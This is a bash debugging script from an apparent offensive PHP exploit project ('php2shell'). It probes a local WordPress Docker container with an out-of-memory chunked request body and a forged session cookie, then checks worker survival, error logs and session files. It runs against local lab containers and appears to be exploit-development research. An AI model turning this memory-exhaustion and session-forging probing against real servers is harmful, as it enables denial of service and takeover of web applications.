#!/usr/bin/env bash
# Why does B1 return 0 bytes on WordPress when A1 OOMs correctly?
#
# Compare the WordPress container against the plain lab container:
#   - worker count and survival after A1
#   - php error log around the OOM
#   - whether a session file appears for the forged cookie
set -u
cd "/mnt/d/AI-Hacking/AI Pentest/php2shell/php2shell-scan-exp" || exit 1

WP_URL="http://127.0.0.1:18120/index.php"
LAB_URL="http://127.0.0.1:8088/index.php"

say() { printf '\n\033[1m== %s\033[0m\n' "$*"; }

say "WP container: ini values that shift the OOM window"
docker exec p2s-wp php -i 2>/dev/null | grep -E \
  '^(memory_limit|post_max_size|upload_max_filesize|max_input_vars|max_file_uploads|max_execution_time)'

say "WP container: worker count before A1"
docker exec p2s-wp sh -c 'ps -C apache2 -o pid=,stat= | wc -l'

say "WP: send A1-shaped chunked body (78 large fields) and read the status"
python3 - <<'PY'
import sys
sys.path.insert(0, "/mnt/d/AI-Hacking/AI Pentest/php2shell/php2shell-scan-exp")
from lib.transport import TransportConfig, send_chunked, get_status_code
from lib.payloads import build_a1_body, QUERY_STRING_128M

cfg = TransportConfig(host="127.0.0.1", port=18120, timeout=120)
body = build_a1_body(big=78)
resp = send_chunked(cfg, "/index.php" + QUERY_STRING_128M, body,
                    cookie="PHPSESSID=" + "a" * 32)
print("  A1 status:", get_status_code(resp), " bytes:", len(resp))
PY

say "WP container: worker count after A1"
docker exec p2s-wp sh -c 'ps -C apache2 -o pid=,stat= | wc -l'

say "WP container: php errors from the last minute"
docker logs p2s-wp --since 2m 2>&1 | grep -E 'Fatal|Segmentation|signal|Allowed memory' | tail -6

say "WP container: session files"
docker exec p2s-wp sh -c 'ls -la /tmp/sess_* 2>/dev/null | tail -5 || echo "(none)"'

say "WP: does a normal request create a session file?"
docker exec p2s-wp sh -c 'rm -f /tmp/sess_wpprobe*'
curl -s -i -m 10 -H "Cookie: PHPSESSID=wpprobe0001" "$WP_URL" >/dev/null
docker exec p2s-wp sh -c 'ls -la /tmp/sess_wpprobe0001 2>/dev/null || echo "(no session file for the forged id)"'
